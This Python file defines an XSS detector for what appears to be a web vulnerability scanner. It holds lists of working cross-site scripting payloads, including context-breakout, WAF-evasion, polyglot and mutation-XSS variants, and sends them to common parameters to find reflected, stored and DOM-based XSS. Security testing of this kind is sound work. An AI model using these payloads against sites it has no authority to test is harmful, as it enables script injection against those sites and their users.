"""XSS (Cross-Site Scripting) Detector
Comprehensive XSS detection with context-aware payloads and WAF bypass techniques
"""

import html
import warnings
import logging
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from urllib.parse import urljoin, urlparse, quote

# Suppress BeautifulSoup XML parsing warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

logger = logging.getLogger(__name__)


class XSSDetector:
    """Detects Cross-Site Scripting vulnerabilities with advanced techniques"""
    
    # Core reliable payloads - highest success rate
    BASIC_PAYLOADS = [
        '<svg/onload=alert(1)>',
        '"/><img src=x onerror=alert(2)>',
        "'><script>alert(3)</script>",
        "<img src=x onerror=alert(4)>",
        "</textarea><svg/onload=alert(5)>",
        "</script><svg/onload=alert(6)>",
        "<details open ontoggle=alert(7)>",
        "javascript:alert(8)",
        "onmouseover=alert(9)",
        "</style><svg/onload=alert(10)>"
    ]
    
    # Context-specific payloads for breaking out of common contexts
    CONTEXT_BREAK_PAYLOADS = [
        # Breaking out of attribute context
        '" autofocus onfocus=alert(1) x="',
        "' autofocus onfocus=alert(2) x='",
        '" onmouseover=alert(3) x="',
        "' onclick=alert(4) x='",
        
        # Breaking out of script context
        '</script><img src=x onerror=alert(5)>',
        '";alert(6);//',
        "';alert(7);//",
        '</script><svg/onload=alert(8)>',
        
        # Breaking out of textarea/title
        '</textarea><img src=x onerror=alert(9)>',
        '</title><img src=x onerror=alert(10)>',
    ]
    
    # WAF evasion and obfuscation techniques
    WAF_EVASION_PAYLOADS = [
        # Case manipulation bypasses keyword filtering
        '<ScRiPt>alert(1)</sCrIpT>',
        '<sCrIpT>alert(2)</ScRiPt>',
        '<iMg sRc=x oNeRrOr=alert(3)>',
        
        # Encoding variations
        '<img src=x onerror=\u0061lert(4)>',  # Unicode escape
        '<img src=x onerror=&#97;lert(5)>',  # Decimal HTML entity
        '<img src=x onerror=&#x61;lert(6)>',  # Hex HTML entity
        '<img src=x onerror=\x61lert(7)>',  # Hex escape
        
        # Null byte injection (legacy PHP/IIS)
        '<img src=x onerror=alert(8)%00>',
        '<svg/onload=alert(9)%00>',
        
        # Whitespace substitution bypasses space filters
        '<img\tsrc=x\tonerror=alert(10)>',  # Tab
        '<img\nsrc=x\nonerror=alert(11)>',  # Newline
        '<img\rsrc=x\ronerror=alert(12)>',  # Carriage return
        '<img/src=x/onerror=alert(13)>',  # Forward slash
        
        # Quote variations
        '<img src=`x` onerror=alert(14)>',  # Backticks
        "<img src='x' onerror=alert(15)>",  # Single quotes
        '<img src="x" onerror=alert(16)>',  # Double quotes
        
        # HTML5 events with autofocus/autoplay
        '<svg><animate onbegin=alert(17)>',
        '<input onfocus=alert(18) autofocus>',
        '<select onfocus=alert(19) autofocus>',
        '<textarea onfocus=alert(20) autofocus>',
        '<keygen onfocus=alert(21) autofocus>',
        '<video><source onerror=alert(22)>',
        '<audio src=x onerror=alert(23)>',
        '<marquee onstart=alert(24)>',
        '<body onload=alert(25)>',
        
        # Data URIs
        '<object data="data:text/html,<script>alert(26)</script>">',
        '<embed src="data:text/html,<script>alert(27)</script>">',
        '<iframe src="data:text/html,<script>alert(28)</script>">',
        
        # Double encoding
        '%253Cscript%253Ealert(29)%253C%252Fscript%253E',
        
        # HTML entity encoding
        '<svg><script>alert&lpar;30&rpar;</script>',
        '<svg><script>alert&#40;31&#41;</script>',
        '&lt;img src=x onerror=alert(32)&gt;',
        
        # Template literal injection (modern JS frameworks)
        '${alert(33)}',
        '{{alert(34)}}',
        '[[alert(35)]]',
        '{alert(36)}',
        
        # Protocol handlers
        '<iframe src=javascript:alert(37)>',
        '<form action=javascript:alert(38)><input type=submit>',
        '<a href=javascript:alert(39)>click</a>',
        
        # Polyglot payloads (work in multiple contexts)
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(40)//>',
        '"/><marquee onstart=alert(41)></marquee>',
        
        # DOM clobbering
        '<form name=x><input id=attributes>',
        '<img name=innerHTML>',
        
        # Mutation XSS (mXSS)
        '<noscript><p title="</noscript><img src=x onerror=alert(42)>">',
        '<listing><!--</listing><img src=x onerror=alert(43)>-->',
    ]
    
    # Priority payloads for quick scan - highest success rate
    QUICK_PAYLOADS = [
        '<svg/onload=alert(1)>',  # XML-based, works in most contexts
        '"/><img src=x onerror=alert(2)>',  # Breaks out of double-quoted attributes
        "'><script>alert(3)</script>",  # Breaks out of single-quoted attributes
        '<img src=x onerror=alert(4)>',  # Simple image tag
        '</script><svg/onload=alert(5)>',  # Breaks out of script tags
    ]
    
    # Common XSS-prone parameter names found in web applications
    COMMON_PARAMS = [
        "q", "search", "query", "keyword", "s", "searchterm",  # Search parameters
        "id", "uid", "user", "username", "name",  # Identity parameters
        "msg", "message", "comment", "text", "content",  # User content
        "url", "redirect", "next", "return", "callback",  # URL parameters
        "input", "data", "value", "title", "description",  # Generic inputs
        "email", "lang", "locale", "debug", "error"  # Other common params
    ]

    def __init__(self, client, quick_mode=False):
        """Initialize XSS detector
        
        Args:
            client: HTTP client for making requests
            quick_mode: If True, use only high-confidence payloads for speed
        """
        self.client = client
        self.quick_mode = quick_mode
        logger.info(f"XSS Detector initialized (quick_mode={quick_mode})")

    def test(self, path, param=None):
        """Test endpoint for XSS vulnerabilities
        
        Args:
            path: URL path to test
            param: Specific parameter to test, or None to test common params
            
        Returns:
            Dictionary with finding details if vulnerability found, None otherwise
        """
        # Determine which parameters to test
        params_to_test = [param] if param else self.COMMON_PARAMS
        
        # In quick mode, test fewer parameters for speed
        if self.quick_mode and not param:
            params_to_test = self.COMMON_PARAMS[:5]  # Top 5 most common
        
        # Select payload set based on scan mode
        if self.quick_mode:
            payloads = self.QUICK_PAYLOADS
        else:
            # Full scan: combine all payload types for comprehensive coverage
            payloads = self.BASIC_PAYLOADS + self.CONTEXT_BREAK_PAYLOADS + self.WAF_EVASION_PAYLOADS
        
        for test_param in params_to_test:
            # Test each payload against the parameter
            for payload in payloads:
                try:
                    # Send request with XSS payload
                    res = self.client.get(path, params={test_param: payload})
                    if not res or not hasattr(res, 'text'):
                        continue
                    
                    response_text = res.text
                    
                    # Check if payload is reflected unescaped in response (HIGH CONFIDENCE)
                    if payload in response_text:
                        context = self._detect_context(BeautifulSoup(response_text, "html.parser"), response_text, payload)

                        # Test for stored XSS: Check if payload persists without parameter
                        try:
                            res_plain = self.client.get(path)
                            if res_plain and hasattr(res_plain, 'text') and payload in res_plain.text:
                                logger.warning(f"Stored XSS detected at {path} (param: {test_param})")
                                return {
                                    "type": "xss",
                                    "severity": "CRITICAL",
                                    "endpoint": path,
                                    "param": test_param,
                                    "payload": payload,
                                    "context": context,
                                    "evidence": "Payload persisted without parameter - STORED XSS",
                                    "xss_type": "stored",
                                    "confidence": 0.95
                                }
                        except Exception as e:
                            logger.debug(f"Error checking for stored XSS: {e}")

                        # Reflected XSS detected
                        confidence = self._calculate_confidence(context, payload, response_text)
                        logger.info(f"Reflected XSS found at {path} (param: {test_param}, context: {context})")
                        return {
                            "type": "xss",
                            "severity": "HIGH" if confidence > 0.8 else "MEDIUM",
                            "endpoint": path,
                            "param": test_param,
                            "payload": payload,
                            "context": context,
                            "evidence": f"Payload reflected unescaped in {context} context",
                            "xss_type": "reflected",
                            "confidence": confidence
                        }
                    
                    # Check for partially escaped payloads (MEDIUM CONFIDENCE)
                    # HTML encoding applied but may still be exploitable
                    encoded_payload = html.escape(payload)
                    if encoded_payload in response_text and encoded_payload != payload:
                        logger.info(f"HTML-encoded reflection at {path} (param: {test_param})")
                        return {
                            "type": "xss",
                            "severity": "MEDIUM",
                            "endpoint": path,
                            "param": test_param,
                            "payload": payload,
                            "evidence": "Payload reflected but HTML-encoded (may be exploitable in certain contexts)",
                            "context": "html_encoded",
                            "xss_type": "reflected",
                            "confidence": 0.5
                        }
                        
                except Exception as e:
                    logger.debug(f"Error testing payload {payload[:50]}: {e}")
                    continue
            
            # FALLBACK: Check for DOM-based XSS patterns
            # DOM XSS doesn't reflect server-side but uses client-side JavaScript sinks
            if not self.quick_mode:  # Skip DOM detection in quick mode for speed
                try:
                    res_probe = self.client.get(path, params={test_param: "diogenes_xss_probe"})
                    if res_probe and hasattr(res_probe, 'text') and res_probe.text:
                        dom_signal = self._detect_dom_xss_signal(res_probe.text, test_param)
                        if dom_signal:
                            logger.info(f"DOM XSS signal detected at {path} (param: {test_param})")
                            return {
                                "type": "xss",
                                "severity": "MEDIUM",
                                "endpoint": path,
                                "param": test_param,
                                "payload": f"Manual testing recommended with: {self.BASIC_PAYLOADS[0]}",
                                "evidence": dom_signal,
                                "context": "dom",
                                "xss_type": "dom",
                                "confidence": 0.6
                            }
                except Exception as e:
                    logger.debug(f"Error detecting DOM XSS: {e}")
        
        return None

    def _calculate_confidence(self, context, payload, response_text):
        """Calculate confidence score based on context and payload characteristics
        
        Args:
            context: Injection context (script, attribute, html_text, etc.)
            payload: The payload used
            response_text: The response containing the payload
            
        Returns:
            Float between 0 and 1 representing confidence
        """
        base_confidence = 0.7
        
        # Higher confidence for dangerous contexts
        if context == "script":
            base_confidence = 0.95
        elif context == "html_text":
            base_confidence = 0.9
        elif context.startswith("html_attribute:"):
            # Check if it's an event handler attribute (high risk)
            attr_name = context.split(":")[1] if ":" in context else ""
            if attr_name.startswith("on"):  # onclick, onload, etc.
                base_confidence = 0.95
            else:
                base_confidence = 0.85
        elif context == "style":
            base_confidence = 0.75
        elif context == "json_string":
            base_confidence = 0.7
        
        # Boost confidence if payload contains script execution
        if any(keyword in payload.lower() for keyword in ["<script", "onerror=", "onload=", "javascript:"]):            base_confidence = min(0.95, base_confidence + 0.1)
        
        return base_confidence
    
    def _detect_context(self, soup, raw_text, payload):
        """Detect the context where the payload is injected
        
        Args:
            soup: BeautifulSoup parsed HTML
            raw_text: Raw HTML response
            payload: The injected payload
            
        Returns:
            String describing the injection context
        """
        try:
            # CRITICAL: Check if payload is in script tag (direct code execution)
            if self._in_tag(raw_text, payload, "script"):
                return "script"
            
            # HIGH RISK: Check if payload is in style tag (CSS injection)
            if self._in_tag(raw_text, payload, "style"):
                return "style"
            
            # Check if payload is in HTML attributes
            for tag in soup.find_all():
                for attr_name, attr_value in tag.attrs.items():
                    if isinstance(attr_value, str) and payload in attr_value:
                        return f"html_attribute:{attr_name}"
                    elif isinstance(attr_value, list):
                        for val in attr_value:
                            if isinstance(val, str) and payload in val:
                                return f"html_attribute:{attr_name}"
            
            # Check if payload is in visible text content
            if payload in soup.get_text():
                return "html_text"
            
            # Check for JSON/JavaScript object context
            if f'"{payload}"' in raw_text or f"'{payload}'" in raw_text:
                return "json_string"
            
            # Check for URL parameter context
            href_check = 'href="' + payload + '"'
            src_check = 'src="' + payload + '"'
            if href_check in raw_text or src_check in raw_text:
                return "url_parameter"
            
            return "unknown"
        except Exception as e:
            logger.debug(f"Error detecting context: {e}")
            return "unknown"

    def _in_tag(self, raw_text, payload, tag):
        """Check if payload appears within a specific HTML tag
        
        Args:
            raw_text: Raw HTML response
            payload: The payload to search for
            tag: Tag name (e.g., 'script', 'style')
            
        Returns:
            True if payload is within the tag, False otherwise
        """
        try:
            lower = raw_text.lower()
            start_tag = f"<{tag}"
            end_tag = f"</{tag}>"
            start = 0
            
            while True:
                idx = lower.find(start_tag, start)
                if idx == -1:
                    return False
                end = lower.find(end_tag, idx)
                if end == -1:
                    return False
                block = raw_text[idx:end]
                if payload in block:
                    return True
                start = end + len(end_tag)
        except Exception as e:
            logger.debug(f"Error in _in_tag: {e}")
            return False

    def _detect_dom_xss_signal(self, raw_text, param):
        """Detect potential DOM-based XSS patterns
        
        Looks for dangerous JavaScript patterns that use user-controllable sources
        and pass them to dangerous sinks without proper sanitization.
        
        Args:
            raw_text: HTML response to analyze
            param: Parameter name being tested
            
        Returns:
            String describing the DOM XSS signal if found, empty string otherwise
        """
        try:
            soup = BeautifulSoup(raw_text or "", "html.parser")
            scripts = soup.find_all("script")

            # Dangerous sinks that execute code or render HTML
            sinks = [
                "innerhtml", "outerhtml", "insertadjacenthtml",
                "document.write", "document.writeln",
                "eval(", "settimeout(", "setinterval(", "function(",
                "location=", "location.href=", "location.replace(",
                "srcdoc=", "src=",
                "setattribute(",
                ".html(", "jquery.html(", "$.html(",  # jQuery
                "dangerouslysetinnerhtml",  # React
                "bypasssecuritytrusthtml",  # Angular
            ]
            
            # User-controllable sources
            sources = [
                "location", "document.url", "document.location",
                "location.hash", "location.search", "location.href",
                "document.referrer", "window.name",
                "localstorage", "sessionstorage",
                "window.location", "document.documenturi"
            ]

            # Check inline scripts
            for script in scripts:
                js = (script.string or script.get_text() or "")
                signal = self._analyze_js_for_dom_xss(js, sinks, sources, param)
                if signal:
                    return signal + " (inline script)"

            # Check external JavaScript bundles (limited for performance)
            if not self.quick_mode:
                external_scripts = soup.find_all("script", src=True)
                for idx, script in enumerate(external_scripts[:3]):  # Only check first 3
                    src = script.get("src")
                    if not src:
                        continue
                    
                    try:
                        # Resolve relative URLs
                        base = getattr(self.client, "base_url", "") or ""
                        src_url = urljoin(base + "/", src) if base else src

                        # Only check same-origin scripts
                        if src_url.startswith(("http://", "https://")):
                            if urlparse(src_url).netloc and urlparse(src_url).netloc != urlparse(base).netloc:
                                continue

                        res = self.client.get(src_url)
                        if not res or not hasattr(res, 'text'):
                            continue
                        
                        # Skip large files (>1MB)
                        content_len = len(getattr(res, "content", b"") or b"")
                        if content_len > 1024 * 1024:
                            continue
                        
                        # Verify it's JavaScript
                        ct = (getattr(res, "headers", {}) or {}).get("Content-Type", "").lower()
                        if ct and not any(t in ct for t in ["javascript", "text", "json"]):
                            continue

                        signal = self._analyze_js_for_dom_xss(res.text or "", sinks, sources, param)
                        if signal:
                            return signal + f" (external script: {src[:50]})"

                    except Exception as e:
                        logger.debug(f"Error analyzing external script {src}: {e}")
                        continue
                        
        except Exception as e:
            logger.debug(f"Error in _detect_dom_xss_signal: {e}")
            return ""

        return ""

    def _analyze_js_for_dom_xss(self, js_text, sinks, sources, param):
        """Analyze JavaScript code for DOM XSS patterns
        
        Args:
            js_text: JavaScript code to analyze
            sinks: List of dangerous JavaScript sinks
            sources: List of user-controllable sources
            param: Parameter name being tested
            
        Returns:
            String describing the issue if pattern found, empty string otherwise
        """
        try:
            js = (js_text or "").lower()
            if not js or len(js) < 10:
                return ""

            has_sink = any(sink in js for sink in sinks)
            has_source = any(source in js for source in sources)
            references_param = bool(param) and (param.lower() in js)

            # HIGH confidence: Has sink, source, and references the exact parameter
            if has_sink and has_source and references_param:
                return f"DOM XSS pattern: dangerous sink + URL source + '{param}' parameter reference"

            # MEDIUM confidence: Has sink and source but no direct param reference
            if has_sink and has_source:
                return "DOM XSS pattern: dangerous sink + URL source detected"
                
        except Exception as e:
            logger.debug(f"Error analyzing JavaScript: {e}")
            return ""
            
        return ""

